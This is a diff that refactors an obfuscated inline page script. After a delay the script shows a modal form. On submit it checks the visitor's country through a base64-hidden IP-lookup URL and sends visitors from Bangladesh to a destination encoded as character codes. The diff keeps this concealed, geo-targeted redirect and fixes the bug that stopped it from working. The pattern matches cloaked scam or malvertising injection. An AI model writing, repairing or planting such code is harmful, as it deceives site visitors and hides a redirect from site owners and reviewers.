@@ -1,17 +1,6 @@
 <script>
 (function(){
-  var _0x5a2f=function(_0x3f6b){
-    return atob(_0x3f6b)
-  };
-
-  var _0x9e1a=[
-    "bQ==","cw==","Yg==","aQ==","Zg==","ZA==",
-    "bQ==","aQ==","Yg==","Yg==","Yg==","ZA=="
-  ];
-
-  var _0x3d8e=function(){
-    return _0x9e1a.map(x=>_0x5a2f(x)).join("")
-  };
+  var _0x5a2f=function(s){return atob(s)};
 
   var _0x4f3c=(function(){
     return String.fromCharCode(
@@ -26,23 +15,22 @@
   var _d=document,
       _w=window,
       _n=navigator,
-      _m=_d["getElementById"]("m"),
-      _s=_d["getElementById"]("s"),
-      _b=_d["getElementById"]("b"),
-      _i=_d["getElementById"]("i"),
-      _f=_d["getElementById"]("f");
+      _m=_d.getElementById("m"),
+      _s=_d.getElementById("s"),
+      _b=_d.getElementById("b"),
+      _i=_d.getElementById("i"),
+      _f=_d.getElementById("f");
 
-  var _hide=function(){
-    _m.style.display="none"
-  };
+  if(!_m||!_f) return;
 
-  var _isMobile=(function(u){
-    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(u)
-  })(_n.userAgent);
+  var _hide=function(){_m.style.display="none"};
+
+  var _isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+    .test(_n.userAgent);
 
   setTimeout(function(){
     _m.style.display="flex";
-    _i.focus()
+    try{_i.focus()}catch(e){}
   },1000);
 
   _f.onsubmit=function(e){
@@ -54,22 +42,26 @@
       _s.textContent="";
       _hide();
       _b.disabled=false;
-      return
+      return;
     }
 
     fetch(_0x5a2f("aHR0cHM6Ly9pcGFwaS5jby9jb3VudHJ5Lw=="))
-    .then(function(r){return r.text()})
-    .then(function(c){
-      c=c.trim().toUpperCase();
-      (c==="BD")
-        ? (_w.location.href=_4f3c)
-        : (_s.textContent="",_hide(),_b.disabled=false)
-    })
-    .catch(function(){
-      _s.textContent="";
-      _hide();
-      _b.disabled=false
-    })
-  }
+      .then(r=>r.text())
+      .then(c=>{
+        c=c.trim().toUpperCase();
+        if(c==="BD"){
+          _w.location.href=_0x4f3c;
+        }else{
+          _s.textContent="";
+          _hide();
+          _b.disabled=false;
+        }
+      })
+      .catch(()=>{
+        _s.textContent="";
+        _hide();
+        _b.disabled=false;
+      });
+  };
 })();
 </script>
